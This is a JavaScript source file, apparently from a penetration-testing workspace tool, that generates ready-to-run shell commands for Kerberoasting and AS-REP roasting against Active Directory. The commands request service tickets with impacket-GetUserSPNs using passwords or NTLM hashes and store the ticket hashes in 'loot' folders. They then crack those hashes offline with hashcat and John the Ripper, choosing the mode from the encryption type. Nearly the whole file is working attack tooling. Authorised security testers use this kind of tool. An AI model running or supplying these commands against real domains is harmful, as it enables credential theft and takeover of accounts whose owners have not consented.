import { visibleDiscoveries } from "./evidence.js";

const shellQuote = (value) => `'${String(value).replaceAll("'", "'\"'\"'")}'`;

const identityFolder = (domain, username) =>
  `${domain}_${username}`.replace(/[^a-zA-Z0-9._@-]+/g, "_").replace(/^_+|_+$/g, "");

const credentialCandidates = (accounts, variables) => [
  {
    id: "command-context",
    domain: variables.domain,
    username: variables.user,
    secret: variables.password?.trim() || variables.hash?.trim(),
  },
  ...accounts,
];

const ticketDetails = (ticket) => {
  const match = String(ticket).match(/^\$krb5(tgs|asrep)\$(\d+)\$/i);
  if (!match) return null;
  const type = match[1].toLowerCase() === "tgs" ? "TGS" : "AS-REP";
  const etype = match[2];
  const modes = type === "TGS"
    ? { 23: 13100, 17: 19600, 18: 19700 }
    : { 23: 18200, 17: 32100, 18: 32200 };
  return {
    type,
    etype,
    hashcatMode: modes[etype],
    johnFormat: type === "TGS" ? "krb5tgs" : "krb5asrep",
  };
};

export function buildSpnTgsCommands(accounts = [], variables = {}) {
  const commands = [];
  const seen = new Set();

  for (const account of credentialCandidates(accounts, variables)) {
    const domain = account.domain?.trim();
    const username = account.username?.trim();
    const secret = account.secret?.trim();
    if (!domain || !username || !secret) continue;

    const dedupeKey = `${domain.toLowerCase()}\u0000${username.toLowerCase()}\u0000${secret}`;
    if (seen.has(dedupeKey)) continue;
    seen.add(dedupeKey);

    const identity = `${domain}\\${username}`;
    const folder = identityFolder(domain, username);
    const loot = `{{workspaceRoot}}/{{targetName}}/loot/kerberos/spn_tgs/${folder}`;
    const isHash = /^[a-f0-9]{32}$/i.test(secret);
    const target = shellQuote(`${domain}/${username}${isHash ? "" : `:${secret}`}`);
    const hashAuth = isHash ? ` -hashes ${shellQuote(`:${secret}`)}` : "";

    commands.push({
      key: `spn-tgs-request-${account.id ?? folder}`,
      label: `Enumerate SPNs and save TGS hashes — ${identity}`,
      value: `loot="${loot}"; hashes="$loot/hashes.txt"; mkdir -p "$loot"; impacket-GetUserSPNs ${target}${hashAuth} -dc-ip {{rhost}} -request -outputfile "$hashes" | tee "$loot/spn-enumeration.txt"; printf '\n[*] Saved %s ticket hash(es) to %s\n' "$(grep -c '^\\$krb5tgs\\$' "$hashes" 2>/dev/null || true)" "$hashes"; test ! -s "$hashes" || cat "$hashes"`,
    });

    commands.push({
      key: `spn-tgs-hashcat-${account.id ?? folder}`,
      label: `Crack saved TGS hashes with Hashcat — ${identity}`,
      value: `loot="${loot}"; hashes="$loot/hashes.txt"; test -s "$hashes" || { echo "No TGS hashes found at $hashes"; exit 1; }; if grep -qF '$krb5tgs$23$' "$hashes"; then mode=13100; elif grep -qF '$krb5tgs$17$' "$hashes"; then mode=19600; elif grep -qF '$krb5tgs$18$' "$hashes"; then mode=19700; else echo 'Unsupported TGS format'; exit 1; fi; test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz; hashcat -m "$mode" "$hashes" /usr/share/wordlists/rockyou.txt --session "{{targetName}}-${folder}-tgs"; hashcat -m "$mode" "$hashes" --show | tee "$loot/hashcat-cracked.txt"`,
    });

    commands.push({
      key: `spn-tgs-john-${account.id ?? folder}`,
      label: `Crack saved TGS hashes with John — ${identity}`,
      value: `loot="${loot}"; hashes="$loot/hashes.txt"; test -s "$hashes" || { echo "No TGS hashes found at $hashes"; exit 1; }; test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz; john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt "$hashes"; john --format=krb5tgs --show "$hashes" | tee "$loot/john-cracked.txt"`,
    });
  }

  return commands;
}

export function buildKerberosTicketCommands(workspace) {
  const activeTargetId = workspace.activeTargetId;
  const targetName = workspace.variables.targetName;
  const belongs = (entry) => entry.targetId ? entry.targetId === activeTargetId : entry.target === targetName;
  const tickets = visibleDiscoveries(workspace.discoveries, {
    settings: workspace.parserSettings,
    ignored: workspace.ignoredDiscoveries,
    targetId: activeTargetId,
  }).filter(belongs).filter((entry) => entry.type === "kerberos-ticket");
  const commands = [];
  const seen = new Set();
  const groups = new Map();

  for (const ticket of tickets) {
    const value = String(ticket.value || "").trim();
    const details = ticketDetails(value);
    if (!details || seen.has(value)) continue;
    seen.add(value);

    const username = String(ticket.username || "unknown-user").trim();
    const domain = String(ticket.domain || workspace.variables.domain || "unknown-domain").trim();
    const groupKey = `${domain.toLowerCase()}\u0000${username.toLowerCase()}\u0000${details.type}\u0000${details.etype}`;
    const group = groups.get(groupKey) || { details, domain, username, values: [] };
    group.values.push(value);
    groups.set(groupKey, group);
  }

  for (const { details, domain, username, values } of groups.values()) {
    const folder = identityFolder(domain, `${username}_${details.type.toLowerCase().replace("-", "_")}_etype${details.etype}`);
    const loot = `{{workspaceRoot}}/{{targetName}}/loot/kerberos/tickets/${folder}`;
    const hashes = `${loot}/hashes.txt`;
    const identity = `${domain}\\${username}`;
    const suffix = `${folder}-${details.etype}`;

    commands.push({
      key: `kerberos-ticket-save-${suffix}`,
      label: `Save ${values.length} ${details.type} ticket${values.length === 1 ? "" : "s"} as hashes.txt — ${identity}`,
      value: `hashes="${hashes}"; mkdir -p "$(dirname "$hashes")"; printf '%s\\n' ${values.map(shellQuote).join(" ")} > "$hashes"; echo "[*] Saved ${values.length} ${details.type} etype ${details.etype} ticket(s) for ${identity} to $hashes"`,
    });

    if (details.hashcatMode) {
      commands.push({
        key: `kerberos-ticket-hashcat-${suffix}`,
        label: `Hashcat ${details.type} — ${identity}`,
        value: `loot="${loot}"; hashes="$loot/hashes.txt"; test -s "$hashes" || { echo "Run the save command first: $hashes"; exit 1; }; test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz; hashcat -m ${details.hashcatMode} "$hashes" /usr/share/wordlists/rockyou.txt --session "${targetName}-${suffix}"; hashcat -m ${details.hashcatMode} "$hashes" --show | tee "$loot/hashcat-cracked.txt"`,
      });
    }

    commands.push({
      key: `kerberos-ticket-john-${suffix}`,
      label: `John ${details.type} — ${identity}`,
      value: `loot="${loot}"; hashes="$loot/hashes.txt"; test -s "$hashes" || { echo "Run the save command first: $hashes"; exit 1; }; test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz; john --format=${details.johnFormat} --wordlist=/usr/share/wordlists/rockyou.txt "$hashes"; john --format=${details.johnFormat} --show "$hashes" | tee "$loot/john-cracked.txt"`,
    });
  }

  return commands;
}
